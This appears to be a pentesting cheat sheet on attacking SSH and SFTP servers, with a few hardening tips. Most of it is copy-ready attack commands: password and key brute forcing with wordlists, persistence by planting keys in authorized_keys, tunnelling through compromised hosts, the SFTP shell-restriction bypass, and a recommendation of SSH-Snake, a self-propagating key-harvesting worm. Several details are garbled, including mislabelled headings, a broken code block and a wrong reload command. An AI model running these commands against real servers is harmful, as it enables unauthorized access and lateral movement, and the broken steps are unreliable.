# 22 - Pentesting SSH/SFTP

Secure Shell (SSH) is a protocol used to securely connect to another computer over a network. It allows you to log into another computer, execute commands, and transfer files, all in a secure manner. This is because SSH encrypts your connection, making it difficult for hackers to intercept and understand the data being exchanged.

It's commonly used by network administrators to control web servers, by developers to access programming environments, and by anyone needing secure access to a computer over the internet.

## Connect
### Connect with Terminal
If you have knowledge of a target credential, you can establish a remote server connection via SSH using that credential.
```
ssh username@X.X.X.X
```
If you have the private key, you can log in to a remote server using SSH.
```
ssh -i path/to/private_key user@target-ip
```
## Connect with PuTTY (Windows)
Install PuTTY and run it then enter target IP address and port(22 by default) also choose to connect type as SSH.

## Enumeration
### Identifying an FTP Server
You can use Nmap to check if there's an SSH server on a target host like this:
```
nmap -p 22 X.X.X.X
```
## Banner Grabbing
You can use Netcat to find out what service is running and its version by looking at the welcome message it shows when you connect. This method is called Banner Grabbing.
```
nc -vn X.X.X.X 22
```
## Automated audit with ssh-audit
"ssh-audit" is a tool for analyzing SSH connections, providing details on banners, OS/software recognition, compression detection, algorithm information and security recommendations.
```
ssh-audit X.X.X.X 22
```
## Identify Authentication Methods with Nmap
ssh-auth-methods is an Nmap script used to identify the authentication methods supported by an SSH server.
```
nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 X.X.X.X
```
## User Enumeration with Metasploit
The ssh_enumusers module in Metasploit is designed to enumerate valid usernames on a target SSH server. It performs this by attempting to log in with a list of commonly used usernames.
```
msfconsole
msf> use auxiliary/scanner/ssh/ssh_enumusers
```
# Attack Vectors
## Brute Force Attack
Attempt to guess the password of an SSH account:
```
hydra -l user -P /path/to/wordlist.txt ssh://X.X.X.X
```
# SSH Key Brute Forcing
Attempting to crack SSH keys with tools like `John the Ripper``:
```
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash john --wordlist=path/to/wordlist.txt id_rsa.hash
patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
```
## Post-Exploitation
### Port Forwarding
Forward local ports to the attacker's machine to access network services on the target's network:

### Local Port Forwarding
```
ssh -L localPort:remoteHost:remotePort user@sshServer
```
### Local Port Forwarding
```
ssh -R remotePort:localHost:localPort user@sshServer
```
### SSH Tunneling
Use SSH to securely tunnel network traffic:
```
ssh -D 8080 user@X.X.X.X
```
# File Transfer
## SCP (Secure Copy Protocol)
Download files
```
scp user@target-ip:/path/to/remote/file /path/to/local/destination
```
Upload files
```
scp /path/to/local/file user@target-ip:/path/to/remote/destination
```
SFTP (SSH File Transfer Protocol):
```
sftp user@target-ip
```
## Command Execution
Execute commands on the remote machine:
```
ssh user@target-ip 'command_to_run'
```
## Maintaining Access
Deploy SSH keys for persistent access:
```
echo your_public_key >> ~/.ssh/authorized_keys
```
## Privilege Escalation
Leverage local vulnerabilities or misconfigurations to gain elevated privileges.
```
### Check for sudo privileges:
```
ssh user@target-ip 'sudo -l'

## SSH-Snake

If you want to traverse a network using discovered SSH private keys on systems, utilizing each private key on each system for new hosts, then [**SSH-Snake**](https://github.com/MegaManSec/SSH-Snake) is what you need.

SSH-Snake performs the following tasks automatically and recursively:

1. On the current system, find any SSH private keys,
2. On the current system, find any hosts or destinations (user@host) that the private keys may be accepted,
3. Attempt to SSH into all of the destinations using all of the private keys discovered,
4. If a destination is successfully connected to, repeats steps #1 - #4 on the connected-to system.

It's completely self-replicating and self-propagating -- and completely fileless.

## Config Misconfigurations

### Root login

It's common for SSH servers to allow root user login by default, which poses a significant security risk. **Disabling root login** is a critical step in securing the server. Unauthorized access with administrative privileges and brute force attacks can be mitigated by making this change.

**To Disable Root Login in OpenSSH:**

1. **Edit the SSH config file** with: `sudoedit /etc/ssh/sshd_config`
2. **Change the setting** from `#PermitRootLogin yes` to **`PermitRootLogin no`**.
3. **Reload the configuration** using: `sudo systemctl daemon-reload`
4. **Restart the SSH server** to apply changes: `sudo systemctl restart sshd`

### SFTP Brute Force

* [**SFTP Brute Force**](../generic-hacking/brute-force.md#sftp)

### SFTP command execution

There is a common oversight occurs with SFTP setups, where administrators intend for users to exchange files without enabling remote shell access. Despite setting users with non-interactive shells (e.g., `/usr/bin/nologin`) and confining them to a specific directory, a security loophole remains. **Users can circumvent these restrictions** by requesting the execution of a command (like `/bin/bash`) immediately after logging in, before their designated non-interactive shell takes over. This allows for unauthorized command execution, undermining the intended security measures.

[Example from here](https://community.turgensec.com/ssh-hacking-guide/):

```bash
ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash
```

Here is an example of secure SFTP configuration (`/etc/ssh/sshd_config` â€“ openSSH) for the user `noraj`:

```
Match User noraj
        ChrootDirectory %h
        ForceCommand internal-sftp
        AllowTcpForwarding no
        PermitTunnel no
        X11Forwarding no
        PermitTTY no
```

This configuration will allow only SFTP: disabling shell access by forcing the start command and disabling TTY access but also disabling all kind of port forwarding or tunneling.

### SFTP Tunneling

If you have access to a SFTP server you can also tunnel your traffic through this for example using the common port forwarding:

```bash
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```

### SFTP Symlink

The **sftp** have the command "**symlink**". Therefor, if you have **writable rights** in some folder, you can create **symlinks** of **other folders/files**. As you are probably **trapped** inside a chroot this **won't be specially useful** for you, but, if you can **access** the created **symlink** from a **no-chroot** **service** (for example, if you can access the symlink from the web), you could **open the symlinked files through the web**.

For example, to create a **symlink** from a new file **"**_**froot**_**" to "**_**/**_**"**:

```bash
sftp> symlink / froot
```

If you can access the file "_froot_" via web, you will be able to list the root ("/") folder of the system.

### Authentication methods

On high security environment itâ€™s a common practice to enable only key-based or two factor authentication rather than the simple factor password based authentication. But often the stronger authentication methods are enabled without disabling the weaker ones. A frequent case is enabling `publickey` on openSSH configuration and setting it as the default method but not disabling `password`. So by using the verbose mode of the SSH client an attacker can see that a weaker method is enabled:

```bash
ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```

For example if an authentication failure limit is set and you never get the chance to reach the password method, you can use the `PreferredAuthentications` option to force to use this method.

```bash
ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password
```

Review the SSH server configuration is necessary to check that only expected\
methods are authorized. Using the verbose mode on the client can help to see\
the effectiveness of the configuration.

### Config files

```bash
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```
